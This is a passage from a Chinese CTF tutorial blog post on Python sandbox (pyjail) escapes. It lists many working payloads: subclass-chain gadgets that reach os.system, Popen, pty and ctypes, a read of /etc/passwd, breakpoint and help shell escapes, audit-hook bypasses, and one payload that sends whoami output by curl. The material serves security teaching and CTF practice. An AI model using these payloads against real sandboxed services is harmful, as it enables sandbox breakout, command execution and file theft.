__sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed  </span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p><code>__builtins__</code> 是一个特殊的内建模块，不仅可以提供基础的异常和函数，例如 <code>ValueError</code>、<code>len()</code>、<code>print()</code> 等，还提供了一些内建类型，例如 <code>list</code>、<code>dict</code> 和 <code>str</code> 等。</p>
<ol>
<li>沙箱先获取<code>__builtins__</code>，然后根据现有的<code>__builtins__</code>来构建命名空间。</li>
<li>修改<code>__import__</code>函数为自定义的<code>_hook_import_</code></li>
<li>删除 open函数防止文件操作</li>
<li>exec那里，其中<code>_global</code>为一个字典，表示command将在<code>_global</code>指定的命名空间中运行</li>
</ol>
<p>这里只是部分限制了open函数，并且要求不能有黑名单里面的模块</p>
<p>此时要么可以找到不在黑名单里面的模块进行rce或者文件读取，要么可以通过获取其他命名空间里的<code>__builtins__</code>（这个<code>__builtins__</code>保存的就是原始<code>__builtins__</code>的引用），比如types库，来执行任意命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;types&#x27;).__builtins__</span><br><span class="line">__import__(&#x27;string&#x27;).__builtins__</span><br></pre></td></tr></table></figure>

<h5 id="完全限制（no-builtins）"><a href="#完全限制（no-builtins）" class="headerlink" title="完全限制（no builtins）"></a>完全限制（no builtins）</h5><p>如果沙箱完全清空了<code>__builtins__</code>，则无法使用import，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: <span class="built_in">__import__</span> <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>

<p><strong>这种情况下就需要利用python继承链来绕过</strong>，就是Python继承链获取内置类，然后通过这些内置类获取到敏感方法再进行利用。</p>
<p>一些常见的payload:</p>
<p><strong>rce</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess </span></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># builtins</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># help</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;help&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>File</strong></p>
<p>操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;FileLoader&quot; ][0].get_data(0,&quot;/etc/passwd&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="绕过多行限制"><a href="#绕过多行限制" class="headerlink" title="绕过多行限制"></a>绕过多行限制</h4><p>绕过多行限制的利用手法通常在限制了单行代码的情况下使用，例如<strong>eval，中间如果存在<code>;</code>或者换行会报错</strong>。</p>
<h5 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h5><p>exec可以支持换行符与<code>;</code>，如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;exec(&#x27;import os; os.system(\&quot;whoami\&quot;)&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="compile-1"><a href="#compile-1" class="headerlink" title="compile"></a>compile</h5><p>这个也是之前提过的，使用这个函数后就也可以执行多行代码，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="海象表达式"><a href="#海象表达式" class="headerlink" title="海象表达式"></a>海象表达式</h5><p>海象表达式是<u>Python 3.8</u>引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</p>
<p>海象表达式的语法形式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;expression&gt; := &lt;value&gt; if &lt;condition&gt; else &lt;value&gt;</span><br></pre></td></tr></table></figure>

<p>借助海象表达式，我们可以通过列表来替代多行代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;dir&quot;)]&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><h5 id="打开输入流"><a href="#打开输入流" class="headerlink" title="打开输入流"></a>打开输入流</h5><h6 id="input-函数"><a href="#input-函数" class="headerlink" title="input()函数"></a>input()函数</h6><p>如果沙箱内执行的内容是通过input 进行传入的话，可以传入input打开一个新的输入流，然后再输入最终的payload（如<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>），这样可以绕过所有的防护。</p>
<p><strong>但是需要注意</strong>，一般题目只会在外面套一层<code>eval()</code>,这样只会执行<code>input()</code>，为了能够执行我们任意输入的代码，<strong>可以这样传参进去：<code>eval(input)</code>，</strong>这样才能成功执行类似<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>这样的代码。</p>
<p>但是在no builtins 的环境或者题目需要以Http请求的方式传入进行输入时，这种方法就失效了。</p>
<p><strong>如果<code>input()</code>被禁止了，那么还可以尝试下面的其他的输入流方式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下面的方法都需要有sys模块</span><br><span class="line"></span><br><span class="line">（1）sys.stdin.read() 注意输入完毕之后（也许要先enter一下--本地在解释器上尝试的）按 ctrl+d 结束输入 。</span><br><span class="line"></span><br><span class="line">（2）sys.stdin.readline()  </span><br><span class="line"></span><br><span class="line">（3）eval(sys.stdin.readlines()[0]) 这个注意的地方和`(1)`一样，同时注意sys.stdin.readlines() 获得的结果是一个列表</span><br></pre></td></tr></table></figure>



<h6 id="breakpoint-函数"><a href="#breakpoint-函数" class="headerlink" title="breakpoint 函数"></a>breakpoint 函数</h6><p>前面说过这个函数，pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，<strong>以及在任何堆栈帧的上下文中运行任意 Python 代码</strong>。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure>

<h6 id="help-函数"><a href="#help-函数" class="headerlink" title="help 函数"></a>help 函数</h6><p>也是之前说过的，直接给用法（按顺序输入）：<br>help() &#x3D;&#x3D;&gt; os &#x3D;&#x3D;&gt;!ls(或者!sh进入交互式)</p>
<h4 id="变量覆盖与函数篡改"><a href="#变量覆盖与函数篡改" class="headerlink" title="变量覆盖与函数篡改"></a>变量覆盖与函数篡改</h4><p>在Python中，sys模块提供了许多与Python解释器和其环境交互的功能，包括对全局变量和函数的操作。<strong>在沙箱中获取sys模块就可以达到变量覆盖与函数篡改的目的。</strong></p>
<p><code>sys.modules</code>存放了现有模块的引用，通过**访问<code>sys.modules[&#39;__main__&#39;]</code>**就可以访问到当前模块定义的所有函数以及全局变量。可通过如下代码查看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>]))</span><br></pre></td></tr></table></figure>

<p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 <code>__builtins__</code>篡改内置函数等,这只是一个思路.</p>
<p>总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.</p>
<h5 id="利用-gc-获取已删除模块"><a href="#利用-gc-获取已删除模块" class="headerlink" title="利用 gc 获取已删除模块"></a>利用 gc 获取已删除模块</h5><p>思路来源于 <a href="https://github.com/fab1ano/hxp-ctf-20/tree/master/audited">writeup by fab1ano – github</a>（有docker）</p>
<p>这道题的目标是覆盖<code>__main__</code>中的<code>__exit</code>函数，但是题目将<code>sys.modules[&#39;__main__&#39;]</code>删除了，无法直接获取。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br></pre></td></tr></table></figure>

<p><code>gc</code>是Python的内置模块，全名为”garbage collector”，中文译为垃圾回收，**<code>gc</code>模块主要的功能是提供一个接口公开发者直接与Python的垃圾回收机制进行交互。**</p>
<p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。<code>gc</code> 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p>
<p>下面是一些 <code>gc</code> 模块中的主要函数：</p>
<ol>
<li><code>gc.collect(generation=2)</code>：这个函数会立即触发一次垃圾回收。你可以通过 <code>generation</code> 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</li>
<li><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</li>
<li><code>gc.get_referrers(*objs)</code>：这个函数会返回指向 <code>objs</code> 中任何一个对象的对象列表。</li>
</ol>
<p>exp 如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> gc.get_objects():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__name__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(obj):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;__main__&#x27;</span> <span class="keyword">in</span> obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module __main__&#x27;</span>)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> == obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module os&#x27;</span>)</span><br><span class="line">            mod_os = obj</span><br><span class="line">mod_main.__exit = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&quot;[+] bypass&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p>
<h5 id="利用traceback-获取模块"><a href="#利用traceback-获取模块" class="headerlink" title="利用traceback 获取模块"></a>利用traceback 获取模块</h5><p>主动抛出异常，并获取其后要执行的代码，然后将<code>__exit</code>进行替换，思路巧妙。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    _, _, tb = sys.exc_info()</span><br><span class="line">    nxt_frame = tb.tb_frame</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Walk up stack frames until we find one which</span></span><br><span class="line">    <span class="comment"># has a reference to the audit function</span></span><br><span class="line">    <span class="keyword">while</span> nxt_frame:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;audit&#x27;</span> <span class="keyword">in</span> nxt_frame.f_globals:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nxt_frame = nxt_frame.f_back</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Neuter the __exit function</span></span><br><span class="line">    nxt_frame.f_globals[<span class="string">&#x27;__exit&#x27;</span>] = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Now we&#x27;re free to call whatever we want</span></span><br><span class="line">    os.system(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>使用 python 3.11 发现 <code>nxt_frame = tb.tb_frame</code> 会触发 <code>object.__getattr__</code> hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 python 3.9 (题目版本)中适用</p>
<h4 id="绕过-audit-hook"><a href="#绕过-audit-hook" class="headerlink" title="绕过 audit hook"></a>绕过 audit hook</h4><p>Python 的审计事件包括一系列可能影响到Python程序运行安全性的重要操作。这些事件的种类及名称不同版本的Python解释器有所不同，且可能随着Python解释器的更新而变动。</p>
<p>Python 中的审计事件包括但不限于以下几类：</p>
<ul>
<li><code>import</code>：发生在导入模块时。</li>
<li><code>open</code>：发生在打开文件时。</li>
<li><code>write</code>：发生在写入文件时。</li>
<li><code>exec</code>：发生在执行Python代码时。</li>
<li><code>compile</code>：发生在编译Python代码时。</li>
<li><code>socket</code>：发生在创建或使用网络套接字时。</li>
<li><code>os.system</code>，<code>os.popen</code>等：发生在执行操作系统命令时。</li>
<li><code>subprocess.Popen</code>，<code>subprocess.run</code>等：发生在启动子进程时。</li>
</ul>
<p>比如calc_jail_beginner_level6 这道题，使用了 audithook 构建沙箱,采用白名单来进行限制.audit hook 属于 python 底层的实现,因此常规的变换根本无法绕过.</p>
<p>部分题目源码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  sys.addaudithook(my_audit_hook)</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<p>这里设置了白名单，使用import导入其他函数以及常规的命令执行方法都是会触发audithook，就需要有其他绕过。</p>
<h6 id="loader-load-module导入模块"><a href="#loader-load-module导入模块" class="headerlink" title="__loader__.load_module导入模块"></a><code>__loader__.load_module</code>导入模块</h6><p><code>__loader__.load_module(fullname)</code>也是python中用于导入模块的一个方法并且不需要导入其他任何库。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;os&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>某些情况下也许可以使用。</p>
<p><code>__loader__</code> 实际上指向的是 <code>_frozen_importlib.BuiltinImporter</code> 类,也可以通过别的方式进行获取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>].__name__</span><br><span class="line"><span class="string">&#x27;BuiltinImporter&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__][<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><code>__loader__.load_module</code> 也有一个缺点就是无法导入非内建模块. 例如 socket</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module(<span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">290</span>, <span class="keyword">in</span> _load_module_shim</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">721</span>, <span class="keyword">in</span> _load</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">676</span>, <span class="keyword">in</span> _load_unlocked</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">573</span>, <span class="keyword">in</span> module_from_spec</span><br><span class="line">  File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">776</span>, <span class="keyword">in</span> create_module</span><br><span class="line">ImportError: <span class="string">&#x27;socket&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> a built-<span class="keyword">in</span> module</span><br></pre></td></tr></table></figure>



<h6 id="posixsubprocess-执行命令"><a href="#posixsubprocess-执行命令" class="headerlink" title="_posixsubprocess 执行命令"></a>_posixsubprocess 执行命令</h6><p><code>_posixsubprocess</code> 模块是Python的内部模块，提供了一个用于在UNIX平台上创建子进程的低级别接口。<code>subprocess</code> 模块的实现就用到了<code>_posixsubprocess</code></p>
